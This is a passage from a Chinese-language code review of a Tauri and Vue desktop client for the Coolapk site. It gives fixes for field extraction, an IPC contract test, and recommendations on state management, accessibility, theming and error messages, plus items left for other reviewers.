`str()` 对 `number` 返回 `String(v)`，本意是展示 `id` 之类的数字字段；但在详情页 `str(content.username) || '匿名'` 里，如果服务端把 `username` 给成 `0` 或空串，会渲染成 `'0'`。更实际的问题是：**两个组件各自实现了一份"从多候选 key 里挑值"的 `pick`/`str`，且行为不同**（`FeedItem.pick` 会 `trim()` 判空并接受 `number`；`FeedDetailPage.str` 不做 `trim`）。服务端字段名一旦变化（`username`/`userName`/`author`），首页能显示、详情页显示"匿名"。

**修复**：把字段提取收敛到一处 `src/utils/feed.ts`，两个页面共用：

```ts
export function pickText(item: Record<string, unknown> | null | undefined, ...keys: string[]): string {
  if (!item) return ''
  for (const k of keys) {
    const v = item[k]
    if (typeof v === 'string' && v.trim()) return v
    if (typeof v === 'number' && Number.isFinite(v)) return String(v)
  }
  return ''
}

export const feedUser = (i: Record<string, unknown>) => pickText(i, 'username', 'userName', 'author')
export const feedTime = (i: Record<string, unknown>) => pickText(i, 'dateline', 'createTime', 'time')
```

---

## 建议

### R-01 —— 错误处理约定文档与实现不符，应补一份"契约单一来源"

`docs/ARCHITECTURE.md` §6、§7 里写的 `invoke('coolapk_request', ...)`、`invoke('coolapk_browse', ...)` **在代码里都不存在**（实际命令名是 `browse` / `detail` / …）。
目前契约靠"两边手动对齐"，靠的正是本次逐条核对。建议：

1. 把本文第 2 节的核对表作为**契约的唯一真相来源**，任何一侧改签名必须先改表；
2. 加一个极低成本的守卫测试 `src/api/contract.test.ts`：mock `invoke`，对每个导出函数断言"命令名 + 参数对象 key 集合"精确匹配（参数 key 就是最容易出错的地方，`submitValidation` 这类必须有断言）：

```ts
import { describe, expect, it, vi } from 'vitest'
import { invoke } from '@tauri-apps/api/core'
import { submitValidation } from '../api'

vi.mock('@tauri-apps/api/core', () => ({ invoke: vi.fn().mockResolvedValue(true) }))

describe('IPC 契约', () => {
  it('submit_validation 使用 camelCase 参数', async () => {
    await submitValidation('cid', '_v2_post_token', 'v')
    expect(invoke).toHaveBeenCalledWith('submit_validation', {
      challengeId: 'cid',
      field: '_v2_post_token',
      validate: 'v',
    })
  })
})
```

### R-02 —— Pinia 装了但没用，跨页状态无处安放

`src/main.ts:6` `createPinia()`，但 `src/` 下**没有 `stores/` 目录**，与 `ARCHITECTURE.md §5` 的结构图明显偏离。结果是：

- 从详情页返回首页，`items` 全部丢失重新请求；
- 搜索关键词、滚动位置都不保留；
- 每次进详情页都重新拉评论。

建议至少建 `src/stores/feed.ts`（`items` / `page` / `hasMore` / `scrollTop` / `load/reset`），把 `HomePage` 里那套分页状态搬进去，同时天然解决 N-01/N-02 的并发与恢复问题。

### R-03 —— `App.vue` 的 Tab 没有语义，且活动态不随子路由正确高亮

`src/App.vue:13-15`：`isActive('home')` 用 `route.path.startsWith('/home')`，进入 `/feed/xxx` 时**三个 Tab 全部不高亮**（用户失去位置感）。`App.vue:22-32` 的 `<nav>` 里用的是 `<button>`，没有 `aria-current`。

```diff
-        <button
+        <button
           v-for="tab in tabs"
           :key="tab.key"
           class="tab"
           :class="{ active: isActive(tab.key) }"
+          :aria-current="isActive(tab.key) ? 'page' : undefined"
           @click="router.push(tab.path)"
         >
```

```ts
// 细化：详情页视为 home 的上下文
function isActive(key: string) {
  if (key === 'home') return route.path.startsWith('/home') || route.path.startsWith('/feed')
  return route.path.startsWith(`/${key}`)
}
```

另外建议给标签栏加 `role="tablist"` / `aria-selected`，或改用 `<RouterLink>` 以获得免费的键盘与右键"在新标签页打开"语义（桌面端用户会这么用）。

### R-04 —— 深/浅色主题只跟随系统，没有手动切换

`src/styles/main.css:15` 只有 `@media (prefers-color-scheme: dark)`；而请求头 `X-Dark-Mode` 在 Rust 侧被硬编码为 `false`（`client.rs:130`）。设置页没有主题开关。建议在 `SettingsPage.vue` 增加主题三态（跟随系统 / 浅 / 深），用 `data-theme` 属性驱动 `:root` 变量，并把选择传给 Rust（需要新增命令或在 `session_info` 往返里带）。

### R-05 —— 没有"加载更多"时的滚动无限加载；`content` 容器滚动而非 `window`

`App.vue:89-92` 里 `.content { overflow-y: auto }`，滚动事件不冒泡到 `window`。若后续实现 `IntersectionObserver` 做无限滚动，`root` 必须传 `.content` 元素而不是默认视口，否则**永远不会触发**。这是个迟早会踩的坑，先记在这里。

### R-06 —— `LoadingList` 骨架屏在减少动态效果偏好下仍在动画

`src/styles/main.css:128-148` 的 `@keyframes shimmer` 没有 `@media (prefers-reduced-motion: reduce)` 分支。建议：

```css
@media (prefers-reduced-motion: reduce) {
  .skeleton { animation: none; }
}
```

### R-07 —— `index.html` 缺少应用级基础无障碍设置

`index.html` 已有 `lang="zh-CN"` ✅。建议补 `<meta name="color-scheme" content="light dark">`，否则 Tauri WebView 里的原生滚动条、表单控件在深色主题下仍是浅色。

### R-08 —— `SearchPage` 的 `type="search"` 输入框没有 `<label>`

`src/pages/SearchPage.vue:40-46`：只有 `placeholder`。placeholder 不是 label，读屏会读成"编辑框"而没有名称。加 `aria-label="搜索关键词"` 即可。同理 `SettingsPage.vue:60-65` 的 `<textarea>` 只有 `placeholder`。

### R-09 —— `env.d.ts` 建议补 `vite/client` 与 Tauri 类型

未审到 `env.d.ts` 的缺陷，但建议确认包含：

```ts
/// <reference types="vite/client" />
```

否则 `import.meta.env` 在后续引入环境变量时会失去类型。

### R-10 —— 错误文案与 Rust 侧 `Display` 不一致（信息浪费）

Rust 已经为每个 `Error` 变体写了好文案（`error.rs:91-116`，例如 "请求需要人机验证，请完成验证后重试"、"服务端检测到网络环境异常，请检查代理、DNS 或网络过滤设置"），前端 `errorMessage`（`index.ts:52-73`）**逐条重写了一遍且更简略**，两处将来必然不同步。建议让 Rust 在序列化时附加 `display: self.to_string()` 字段，前端优先用它，`errorMessage` 只做兜底。

---

## 附：本次审查未覆盖 / 需他人跟进

| 事项 | 原因 | 建议归属 |
| --- | --- | --- |
| `client.rs:260-275` `submit_validation` 用 `try_lock`，锁被占用时**静默返回 `false`**，前端无法区分"validate 非法"与"锁忙" | 属 Rust 协议层审查 | task-2 / protocol-reviewer |
| `lib.rs` 中 `Mutex<CoolapkClient>` 全程 `std::sync::Mutex` + `.await` 持锁，会把所有 IPC 串行化 | 属 Rust 审查 | task-2 / protocol-reviewer |
| 验证码 WebView 窗口本身未实现（只有 `submit_validation` 落会话） | 属阶段 2 功能 | Lead 统筹 |
| `.github/workflows/build.yml` 被并发修改、`src/api/index.test.ts` 为他人新增（非本次审查产物） | 不在 task-3 范围 | task-1 / ci-watcher |

---

**再次确认：本次审查 7 个命令 / 11 个参数 / 9 种错误 kind 全部逐条核对完毕，未发现任何命令名或参数名不匹配。**
`submit_validation(challenge_id, field, validate)` ↔ `{ challengeId, field, validate }` ✅ —— 与你给出的对照表一致。
